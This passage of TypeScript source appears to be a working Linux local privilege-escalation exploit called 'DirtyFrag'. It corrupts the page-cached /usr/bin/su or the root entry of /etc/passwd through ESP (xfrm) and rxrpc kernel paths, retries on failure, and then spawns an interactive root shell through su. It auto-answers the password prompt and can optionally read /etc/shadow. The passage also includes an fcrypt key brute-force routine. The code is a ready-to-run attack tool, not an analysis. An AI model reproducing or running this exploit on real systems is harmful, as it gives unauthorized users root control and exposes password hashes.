      const _ge0 = cstr("getent"), _ge1 = cstr("getent");
      const _pa  = cstr("passwd"), _ro  = cstr("root");
      const gpid = C.fork() as number;
      if (gpid === 0) {
        C.close(pr);
        C.dup2(pw, 1);
        C.dup2(pw, 2);
        C.close(pw);
        C.execlp(_ge0, _ge1, _pa, _ro, null);
        C._exit(127);
      }
      C.close(pw);
      const gbuf = Buffer.alloc(1024);
      const gr = C.read(pr, ptr(gbuf), BigInt(gbuf.length - 1)) as bigint;
      C.close(pr);
      const wst = Buffer.alloc(4);
      C.waitpid(gpid, ptr(wst), 0);
      if (gr > 0n)
        process.stderr.write(
          `[getent passwd root] ${gbuf.subarray(0, Number(gr)).toString("ascii")}`,
        );
      process.stderr.write(
        "[+] PRIMITIVE proven: root entry has empty passwd field via NSS.\n",
      );
    }
  }

  // honour --corrupt-only
  if (
    argv.includes("--corrupt-only") ||
    getEnv("DIRTYFRAG_CORRUPT_ONLY") === "1"
  )
    return 0;

  // ── STAGE 4 — spawn interactive root shell via su ─────────────────────────
  process.stderr.write(
    "\n=== STAGE 4: spawning interactive root shell via `su` " +
      "(no password input needed) ===\n\n",
  );
  process.stderr.write = process.stderr.write.bind(process.stderr); // flush

  return rxrpcLpePty();
}

// Separated PTY logic for rxrpc path (mirrors the in-function PTY in C)
function rxrpcLpePty(): number {
  const master = C.posix_openpt(O_RDWR | O_NOCTTY) as number;
  if (
    master < 0 ||
    (C.grantpt(master) as number) < 0 ||
    (C.unlockpt(master) as number) < 0
  ) {
    WARN(`posix_openpt: ${errStr()}`);
    return 5;
  }
  const slaveName = readCStr(C.ptsname(master) as number);

  const ws = Buffer.alloc(SIZEOF_WINSIZE, 0);
  if ((C.ioctl(STDIN_FILENO, TIOCGWINSZ, ptr(ws)) as number) === 0)
    C.ioctl(master, TIOCSWINSZ, ptr(ws));

  // Pre-allocate all child buffers before fork (avoid JS alloc after fork)
  const _slaveBuf  = cstr(slaveName);
  const _ioctlBuf  = Buffer.alloc(4, 0);
  const _suFile    = cstr("su");
  const _suArg0    = cstr("su");

  const pid = C.fork() as number;
  if (pid < 0) {
    WARN(`fork: ${errStr()}`);
    return 5;
  }
  if (pid === 0) {
    C.setsid();
    const slave = _openFFI(_slaveBuf, O_RDWR, 0) as number;
    if (slave < 0) C._exit(127);
    C.ioctl(slave, TIOCSCTTY, _ioctlBuf);
    C.dup2(slave, 0); C.dup2(slave, 1); C.dup2(slave, 2);
    if (slave > 2) C.close(slave);
    C.close(master);
    C.execlp(_suFile, _suArg0, null, null, null);
    C._exit(127);
  }

  const savedTermios = Buffer.alloc(SIZEOF_TERMIOS, 0);
  const savOk = (C.tcgetattr(STDIN_FILENO, ptr(savedTermios)) as number) === 0;
  if (savOk) {
    const raw = Buffer.from(savedTermios);
    C.cfmakeraw(ptr(raw));
    C.tcsetattr(STDIN_FILENO, TCSANOW, ptr(raw));
  }

  let autoPwSent = false,
    stdinEof = false,
    totalMs = 0;
  const autoVerify = getEnv("LPE_AUTO_VERIFY") === "1";
  let verifySent = false;
  const buf = Buffer.alloc(4096);

  loop: for (;;) {
    const pfds = Buffer.alloc(2 * SIZEOF_POLLFD, 0);
    pfds.writeInt32LE(stdinEof ? -1 : STDIN_FILENO, 0);
    pfds.writeInt16LE(POLLIN, 4);
    pfds.writeInt32LE(master, 8);
    pfds.writeInt16LE(POLLIN, 12);
    C.poll(ptr(pfds), 2, 200);
    totalMs += 200;

    const r1 = pfds.readInt16LE(14);
    const r0 = pfds.readInt16LE(6);

    if (r1 & POLLIN) {
      const n = C.read(master, ptr(buf), BigInt(buf.length)) as bigint;
      if (n <= 0n) break loop;
      C.write(STDOUT_FILENO, ptr(buf), n);
      if (!autoPwSent && n < BigInt(buf.length)) {
        const s = buf.subarray(0, Number(n)).toString("ascii");
        if (s.includes("Password") || s.includes("password")) {
          const nl = Buffer.from("\n");
          C.write(master, ptr(nl), 1n);
          autoPwSent = true;
        }
      }
    }
    if (!stdinEof && r0 & POLLIN) {
      const n = C.read(STDIN_FILENO, ptr(buf), BigInt(buf.length)) as bigint;
      if (n <= 0n) stdinEof = true;
      else C.write(master, ptr(buf), n);
    }
    if (r1 & (POLLHUP | POLLERR)) break loop;

    if (autoVerify && !verifySent && totalMs >= 1000) {
      const cmd = Buffer.from("id; whoami; cat /etc/shadow | head -2; exit\n");
      C.write(master, ptr(cmd), BigInt(cmd.length));
      verifySent = true;
    }

    const wst = Buffer.alloc(4);
    const w = C.waitpid(pid, ptr(wst), WNOHANG) as number;
    if (w === pid) {
      for (let i = 0; i < 5; i++) {
        const pf = Buffer.alloc(SIZEOF_POLLFD, 0);
        pf.writeInt32LE(master, 0);
        pf.writeInt16LE(POLLIN, 4);
        if ((C.poll(ptr(pf), 1, 50) as number) <= 0) break;
        const n = C.read(master, ptr(buf), BigInt(buf.length)) as bigint;
        if (n <= 0n) break;
        C.write(STDOUT_FILENO, ptr(buf), n);
      }
      break loop;
    }
  }
  if (savOk) C.tcsetattr(STDIN_FILENO, TCSANOW, ptr(savedTermios));
  C.close(master);
  return 0;
}

// ── main ──────────────────────────────────────────────────────────────────────

export function main(argv: string[]): number {
  let verbose = !!getEnv("DIRTYFRAG_VERBOSE");
  let forceEsp = false;
  let forceRxrpc = false;
  let savedErr = -1;
  let rc = 1;

  for (const a of argv) {
    if (a === "--force-esp") forceEsp = true;
    else if (a === "--force-rxrpc") forceRxrpc = true;
    else if (a === "-v" || a === "--verbose") verbose = true;
  }

  progress(`uid=${C.getuid()} euid=${C.geteuid()} pid=${C.getpid()}`);
  progress(
    `flags: verbose=${verbose} force-esp=${forceEsp} force-rxrpc=${forceRxrpc}`,
  );

  // already root — just drop into bash
  if ((C.getuid() as number) === 0) {
    progress("already root — exec /bin/bash");
    C.execlp(cstr("/bin/bash"), cstr("bash"), null, null, null);
    C._exit(1);
  }

  const coArgv = [...argv, "--corrupt-only"];
  if (!verbose) savedErr = silenceStderr();

  if (forceRxrpc) {
    progress("path: rxrpc only");
    rc = rxrpcLpeMain(coArgv);
    for (let i = 0; !passwdAlreadyPatched() && i < 3; i++) {
      progress(`rxrpc retry ${i + 1}/3`);
      rc = rxrpcLpeMain(coArgv);
    }
  } else if (forceEsp) {
    progress("path: ESP (xfrm) only");
    rc = suLpeMain(coArgv);
    progress(`suLpeMain returned rc=${rc}`);
  } else {
    progress("path: ESP (xfrm) first, rxrpc fallback");
    progress("stage ESP: corrupting /usr/bin/su page-cache...");
    rc = suLpeMain(coArgv);
    progress(`suLpeMain returned rc=${rc}, su_patched=${suAlreadyPatched()}`);
    if (!suAlreadyPatched()) {
      progress("ESP did not patch su — falling back to rxrpc");
      rc = rxrpcLpeMain(coArgv);
      progress(
        `rxrpcLpeMain returned rc=${rc}, passwd_patched=${passwdAlreadyPatched()}`,
      );
      for (let i = 0; !passwdAlreadyPatched() && i < 3; i++) {
        progress(`rxrpc retry ${i + 1}/3`);
        rc = rxrpcLpeMain(coArgv);
        progress(`  rc=${rc} passwd_patched=${passwdAlreadyPatched()}`);
      }
    }
  }

  const patched = eitherTargetPatched();
  if (!verbose) restoreStderr(savedErr);

  progress(`done — patched=${patched} rc=${rc}`);

  if (patched) {
    progress("spawning root PTY...");
    runRootPty();
    return 0;
  }

  process.stderr.write(`dirtyfrag: failed (rc=${rc})\n`);
  return rc !== 0 ? rc : 1;
}

// ── entry point ───────────────────────────────────────────────────────────────

// Bun top-level: only run when executed directly (not imported)
if (import.meta.main) {
  progress(
    `DirtyFrag TS starting — Bun ${Bun.version} args=[${process.argv.slice(2).join(",")}]`,
  );
  process.exit(main(process.argv.slice(2)));
}

export function findKOfflineGeneric(
  Cbuf: Uint8Array,
  maxIters: bigint,
  check: PcheckFn,
  seedInit: bigint,
  label: string,
): { K: Uint8Array; P: Uint8Array } | null {
  let seed = seedInit;
  const K = new Uint8Array(8);
  const t0 = performance.now();

  for (let iter = 0n; iter < maxIters; iter++) {
    let r: bigint;
    [r, seed] = fcSplitmix64(seed);

    // copy 8 bytes of r (LE) into K
    K[0] = Number(r & 0xffn);
    K[1] = Number((r >> 8n) & 0xffn);
    K[2] = Number((r >> 16n) & 0xffn);
    K[3] = Number((r >> 24n) & 0xffn);
    K[4] = Number((r >> 32n) & 0xffn);
    K[5] = Number((r >> 40n) & 0xffn);
    K[6] = Number((r >> 48n) & 0xffn);
    K[7] = Number((r >> 56n) & 0xffn);

    const sched = fcryptSetkey(K);
    const P = fcryptDecrypt(sched, Cbuf);

    if (check(P)) {
      const dt = (performance.now() - t0) / 1000;
      const mps = (Number(iter) / dt / 1e6).toFixed(2);
      LOG(
        `${label} found after ${iter} iters in ${dt.toFixed(2)}s (${mps}M/s)` +
          ` K=${[...K].map((b) => b.toString(16).padStart(2, "0")).join("")}` +
          ` P=${[...P].map((b) => b.toString(16).padStart(2, "0")).join("")}` +
          ` "${[...P].map((b) => (b >= 32 && b < 127 ? String.fromCharCode(b) : ".")).join("")}"`,
      );
      return { K: K.slice(), P };
    }

    // Log every ~500k iterations (JS BigInt is ~30-50x slower than C)
    if ((iter & 0x7ffffn) === 0n && iter > 0n) {
      const dt = (performance.now() - t0) / 1000;
      const mps = (Number(iter) / dt / 1e6).toFixed(2);
      progress(
        `${label}: iter=${iter} elapsed=${dt.toFixed(1)}s speed=${mps}M/s`,
      );
    }
  }
  return null;
}
